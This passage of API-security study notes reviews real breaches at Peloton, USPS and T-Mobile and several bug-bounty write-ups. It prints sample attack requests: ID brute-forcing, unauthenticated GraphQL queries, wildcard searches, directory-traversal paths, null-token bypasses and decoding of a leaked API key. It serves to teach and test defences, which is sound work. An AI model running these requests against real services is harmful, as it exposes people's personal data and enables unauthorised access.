|📊 `/stats/workouts/details`|Broken "private" toggle — `POST` with a list of user IDs returned age, gender, username, Peloton ID, regardless of the privacy setting|
|🔍 `/api/user/search/:<username>`|Exposed profile pic URL, location, ID, privacy status, follower count — to **anyone**|
|🔮 GraphQL|Unauthenticated query with `currentUserID` as payload position → brute-force IDs → leak username + location|

```json
POST /stats/workouts/details
{"ids":["10001","10002","10003","10004","10005","10006"]}
```

```graphql
query SharedTags($currentUserID: ID!) {
  User: user(id: "currentUserID") { __typename id location }
}
```

> 🔑 **Lesson:** if one API is unprotected, **test the organization's other APIs too** — the gap is rarely isolated.

---

### 📬 USPS Informed Visibility API (Nov 2018)

**~60M users** exposed — email, username, real-time package tracking, mailing address, phone number. Broken by **KrebsOnSecurity**.

Root causes: **authentication misconfiguration + business logic flaw + excessive data exposure + wildcard queries**.

```
GET /api/v1/find?email=*@gmail.com     ← wildcard query worked!
```

```json
POST /api/v1/container/status
{"street": "475 L'Enfant Plaza SW", "city": "Washington DC"}
```

➡️ Returned **every** customer record (past and present) at that address:

```json
{ "customer": [
  {"name":"Rufus Shinra","email":"rufus@shinra.com","phone":"123-456-7890"},
  {"name":"Professor Hojo","email":"prof@hojo.com","phone":"102-202-3034"}
]}
```

⚠️ **Irony:** USPS's own Office of Inspector General had run a security assessment **one month earlier** and declared the app's "encryption and authentication were secure" — their scanners produced **false negatives** because they never tested the API itself.

> 🔑 **Lesson:** traditional web app scanners **miss API-specific logic flaws**. APIs need **dedicated** testing.

---

### 📱 T-Mobile API Breach (Aug 2018)

**2M+ customers** — name, phone, email, DOB, account number, billing ZIP.

T-Mobile never disclosed the technical root cause, but a **near-identical vulnerability** was publicly demonstrated a year earlier (YouTube: "T-Mobile Info Disclosure Exploit" by user "moim") against the **T-Mobile Web Services Gateway API**:

- A single valid auth token + **any phone number (msisdn)** in the URL → returned that customer's full account details (name, IMSI, account status, linked lines)
- Classic **BOLA**: the only "secret" was a guessable/public value (**phone number**)

```
implicitPermissions → user: {IAMEmail, userid} → lines: [{givenName, ban, msisdn, imsi, ...}]
```

> 🔑 **Lesson:** a parameter as "predictable" as a **phone number** makes BOLA trivial to brute-force at scale (2.3M leaked customers = brute-forced msisdn values). ⚠️ **Ethics tip:** if you find this live in a real test, request **separate test accounts/phone numbers** from the client rather than pulling real customer data.

---

## 💰 THE BOUNTIES

### 🔑 The Price of Good API Keys — Ace Candelario ($2,000)

Searched a JS source file for `api`, `secret`, `key` → found a **base64-encoded BambooHR API key**:

```javascript
headers: {'Authorization': 'Basic VXNlcm5hbWU6UGFzc3dvcmQ='}
```

```bash
echo 'VXNlcm5hbWU6UGFzc3dvcmQ=' | base64 -d
→ Username:Password
```

➡️ Used the decoded credentials to log into the HR site and screenshot employee data as **proof of concept**.

> ✅ **Lessons:** always scan JS source for leaked secrets; test what you can actually **do** with a found credential to strengthen your report.

---

### 🔓 Private API Authorization Issues — Omkar Bhagwat ($440)

Found API docs via **directory enumeration**: `academy.target.com/api/docs`.

- `GET /ping` responded **without any auth token** → suspicious
- Found other endpoints failing with `"authorization parameters are missing"` → clue that a **Bearer token** was expected
- Found that **Bearer token exposed** elsewhere in the app
- Added it to requests → could **edit, delete, create user accounts** (admin-level actions) = **BFLA**

> ✅ **Lessons:** public API docs are a goldmine — use them; combine small clues (missing errors, exposed tokens) into bigger findings.

---

### ☕ Starbucks: The Breach That Never Was — Sam Curry ($4,000)

Prevented a breach of **~100 million PII records** (est. cost: **~$350M**).

1. Noticed `/bff/proxy/*` endpoints ("backend for frontend" — proxies requests to an internal API)
2. Found `/bff/proxy/orchestra` blocked user input from reaching the internal API, but `/bff/proxy/user:id` **did** pass it through
3. Tried **directory traversal**:

```
GET /bff/proxy/stream/v1/users/me/streamItems/..\
→ 404 Not Found
```

4. Kept escalating traversal depth:

```
GET /bff/proxy/stream/v1/me/stramItems/web\..\.\..\.\..\.\..\.\..\..\..\.\..\
→ 400 Bad Request   ← different error! Something's different here
```

5. Used **Burp Intruder** to brute-force directories → found a **Microsoft Graph API** instance at `/search/v1/accounts`
6. Queried it → gained access to an **internal customer database** (IDs, usernames, names, emails, cities, addresses, phones)
7. Used Graph API syntax `$count=true` → got the exact record count: **99,356,059**

> ✅ **Lessons:** watch for **subtle status-code differences** (404 vs 400) hiding among noise — that's your signal. Use Burp **Comparer**. Combine recon + evasive brute-forcing (traversal) + knowledge of underlying tech (MS Graph syntax) to escalate a small finding into a massive one.

---

### 📸 An Instagram GraphQL BOLA — Mayur Fartade ($30,000)

Found a BOLA in Instagram's GraphQL endpoint `/api/v1/ads/graphql/` — no authorization check on a `MEDIA_ID` parameter:

```
POST /api/v1/ads/graphql
doc_id=[REDACTED]&query_params={"access_token":"","id":"[MEDIA_ID]"}
```

➡️ With a **null `access_token`**, supplying any `MEDIA_ID` returned full details of **private/archived posts**: likes, comments, linked Facebook pages, image data — for **any user**.

> ✅ **Lessons:** actively hunt GraphQL endpoints — payouts can be huge. If blocked, combine evasive techniques (null bytes etc.) and keep experimenting with token values (even empty/null tokens can bypass checks).

---

## ✅ Quick Summary

```
🚴 Peloton   → broken privacy toggle + open search + unauth GraphQL → brute-force IDs
📬 USPS      → wildcard queries + excessive data exposure + bad auth model
📱 T-Mobile  → BOLA via predictable param (phone number) → mass brute-force
🔑 Candelario → leaked base64 API key in JS source → real HR data access
🔓 Bhagwat   → public docs + exposed Bearer token → BFLA (admin actions)
☕ Curry      → directory traversal (404→400 anomaly) → internal MS Graph API → ~100M records
📸 Fartade    → GraphQL BOLA via unchecked media ID + null access_token → $30K
```

> 🔑 **Overall lesson:** these breaches and bounties all trace back to the **same fundamentals** covered in this book — BOLA, BFLA, excessive data exposure, broken authentication, business logic flaws. Combining several _small_ findings (a leaked token, a subtle status code, a predictable ID) is often what turns a minor bug into a company-ending breach — or a five-figure bounty.
